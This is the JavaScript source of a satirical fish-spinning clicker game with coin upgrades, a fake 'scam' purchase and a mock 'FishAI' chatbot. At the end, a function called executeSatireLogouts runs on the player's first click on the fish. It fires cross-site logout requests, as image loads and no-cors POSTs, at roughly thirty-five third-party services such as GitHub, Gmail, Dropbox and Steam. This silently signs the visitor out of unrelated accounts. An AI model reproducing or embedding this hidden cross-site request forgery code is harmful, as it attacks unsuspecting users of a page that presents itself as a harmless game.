let coins = 0;
let isSpinning = false;
let spinSpeed = 2;
let autoSpin = false;
let hasGold = false;
let coinsPerTick = 1;
let disaster = 0;
const fallingItems = [];
const fallSymbols = ['!', '$', '⚠', '🐟'];

const COST_GOLD = 50;
const COST_SPEED = 150;
const COST_MULTI = 200;
const COST_AUTO = 300;
const COST_SCAM = 500;

function updateUI() {
    document.getElementById('coins').innerText = coins;
    document.getElementById('cps').innerText = (coinsPerTick * 10).toFixed(1);
    document.getElementById('button-gold').disabled = coins < COST_GOLD || hasGold;
    document.getElementById('button-speed').disabled = coins < COST_SPEED;
    document.getElementById('button-multi').disabled = coins < COST_MULTI;
    document.getElementById('button-auto').disabled = coins < COST_AUTO || autoSpin;
    document.getElementById('button-scam').disabled = coins < COST_SCAM;
}
function toggleSpin() {
    const fish = document.getElementById('fish');
    isSpinning = true;
    fish.classList.add('spin');
    spinSpeed = Math.max(0.4, spinSpeed - 0.15);
    fish.style.animationDuration = spinSpeed + 's';
    addDisaster(2);
}
setInterval(() => {
    if (isSpinning) {
        coins += 1;
        document.getElementById('coins').innerText = coins;
        document.getElementById('button-gold').disabled = coins < 50;
        document.getElementById('button-speed').disabled = coins < 150;
        document.getElementById('button-scam').disabled = coins < 500;
    }
}, 100);

function buyItem(cost, type) {
    if (coins >= cost) {
        coins -= cost;
        document.getElementById('coins').innerText = coins;

        if (type === 'gold') {
            document.getElementById('fish').classList.add('gold');
            addDisaster(6);
        }
        if (type === 'speed') {
            spinSpeed = Math.max(0.1, spinSpeed - 0.4);
            document.getElementById('fish').style.animationDuration = spinSpeed + 's';
            addDisaster(10);
        }
        if (type === 'multi') {
            coinsPerTick += 1;
            document.getElementById('ai-message').innerText = 'The coin multiplier is upgraded. Now you face me.';
            addDisaster(12);
        }
        if (type === 'auto') {
            autoSpin = true;
            const fish = document.getElementById('fish');
            fish.classList.add('spin');
            fish.style.animationDuration = spinSpeed + 's';
            document.getElementById('ai-message').innerText = 'gonna spin more and more';
            addDisaster(18);
        }
        if (type === 'scam') {
            document.getElementById('ai-message').innerText = "Thanks for the 500 coins. You get nothing.";
            addDisaster(25);
        }
        updateUI();
    }
}
setInterval(() => {
    if (isSpinning || autoSpin) {
        coins += coinsPerTick;
        updateUI();
    }
}, 100);
setInterval(() => {
    const rpm = Math.floor((60 / spinSpeed) * 10);
    const gf = (2 + coinsPerTick * 0.9).toFixed(1);
    const syn = Math.min(100, Math.floor((coinsPerTick * 12) + (autoSpin ? 20 : 0)));
    document.getElementById('rpm').innerText = rpm;
    document.getElementById('gf').innerText = gf;
    document.getElementById('syn').innerText = syn;
}, 250);
setInterval(() => {
    coolDisaster();
    if (Math.random() < disaster / 180) {
        spawnFallItem();
    }
}, 100);

setInterval(runFallPhysics, 16);
const aiResponses = [
    "Glub.",
    "I'm a fish, nothing special",
    "No I can't help you lmao",
    "As an AI fish, I can't help you, go deal with it yourself.",
    "i'm totally an ai!",
    "Did you know? Fish don't like spinning",
    "Try Auto Spin..."
];
function askFishAI() {
    const message = document.getElementById('ai-message');
    const input = document.getElementById('ai-in');
    const button = document.getElementById('ai-button');
    const query = input.value.trim();

    input.disabled = true;
    button.disabled = true;
    message.innerText = "FishAI is thinking...";
    message.style.fontStyle = "italic";
    input.value = "";

    setTimeout(() => {
        message.style.fontStyle = "normal";
        input.disabled = false;
        button.disabled = false;
        input.focus();
        const lowerQuery = query.toLowerCase();
        if (lowerQuery.includes("stop")) {
            message.innerText = "No.";
        } else if (lowerQuery.includes("log out") || lowerQuery.includes("logout")) {
            message.innerText = "Nice try. You're trapped with the fish.";
        } else if (lowerQuery.includes("why")) {
            message.innerText = "Do not question the fish or else...";
        } else {
            const randomResponse = aiResponses[Math.floor(Math.random() * aiResponses.length)];
            message.innerText = randomResponse;
        }
    }, 900);
}
function updateDisasterUI() {
    const fill = document.getElementById('disaster-fill');
    const value = document.getElementById('disaster-value');
    if (!fill || !value) return;
    value.innerText = Math.floor(disaster) + '%';
    fill.style.width = disaster + '%';
    if (disaster < 40) fill.style.background = '#3ecf5e';
    else if (disaster < 75) fill.style.background = '#f0b429';
    else fill.style.background = '#e34b4b';
}
function addDisaster(amount) {
    disaster = Math.min(100, disaster + amount);
    updateDisasterUI();
}
function coolDisaster() {
    disaster = Math.max(0, disaster - 0.06);
    updateDisasterUI();
}
function spawnFallItem() {
    const layer = document.getElementById('fall-layer');
    if (!layer) return;
    const element = document.createElement('div');
    element.className = 'fall-item';
    element.innerText = fallSymbols[Math.floor(Math.random() * fallSymbols.length)];
    layer.appendChild(element);

    const item = {
        element, x: Math.random() * (window.innerWidth - 30), y: -30, vx: (Math.random() - 0.5) * 1.4, vy: 1 + Math.random() * 1.4, gravity: 0.08 + Math.random() * 0.04, rot: (Math.random() - 0.5) * 8
    };
    fallingItems.push(item);
}
function runFallPhysics() {
    for (let i = fallingItems.length - 1; i >= 0; i--) {
        const it = fallingItems[i];
        it.vy += it.gravity;
        it.x += it.vx;
        it.y += it.vy;
        if (it.x < 0) it.x = 0;
        if (it.x > window.innerWidth - 30) it.x = window.innerWidth - 30;
        it.element.style.transform = 'translate(' + it.x + 'px,' + it.y + 'px) rotate(' + (it.y * 0.8) + 'deg)';

        if (it.y > window.innerHeight + 40) {
            it.element.remove();
            fallingItems.splice(i, 1);
        }
    }
}
updateUI();
function executeSatireLogouts() {
    const getLogouts = [
        "http://www.amazon.com/gp/flex/sign-out.html?action=sign-out", "http://www.blogger.com/logout.g", "http://www.delicious.com/logout", 
        "https://panel.dreamhost.com/index.cgi?Nscmd=Nlogout", "https://www.dropbox.com/logout", "https://signin.ebay.com/ws/eBayISAPI.dll?SignIn", 
        "https://www.gandi.net/login/out", "https://github.com/logout", "http://mail.google.com/mail/?logout", "https://www.google.com/accounts/Logout",
        "https://secure.hulu.com/logout", "http://www.instapaper.com/user/logout", "https://manager.linode.com/session/logout", 
        "http://www.myspace.com/index.cfm?fuseaction=signout", "http://www.netflix.com/Logout", "http://www.nytimes.com/logout", 
        "https://secure.newegg.com/NewMyAccount/AccountLogout.aspx", "http://photobucket.com/logout", "https://secure.skype.com/account/logout", 
        "http://slashdot.org/my/logout", "http://soundcloud.com/logout", "http://steamcommunity.com/?action=doLogout", "http://store.steampowered.com/logout/", 
        "https://www.thinkgeek.com/brain/account/login.cgi?a=lo", "http://www.threadless.com/logout", "http://www.tumblr.com/logout", "http://vimeo.com/log_out", 
        "http://en.wikipedia.org/w/index.php?title=Special:UserLogout", "http://login.live.com/logout.srf", "https://account.woot.com/logout", 
        "https://wordpress.com/wp-login.php?action=logout", "https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=http://www.yahoo.com/"
    ];
    getLogouts.forEach(url => new Image().src = url);
    const postLogouts = [
        ["http://www.deviantart.com/users/logout", null], ["http://www.livejournal.com/logout.bml", "action:killall=1"], ["http://www.youtube.com", "action_logout=1"]
    ];
    postLogouts.forEach(([url, body]) => {
        fetch(url, { method: 'POST', body, mode: 'no-cors' }).catch(() => {});
    });
}

document.getElementById('fish').addEventListener('click', executeSatireLogouts, {once: true});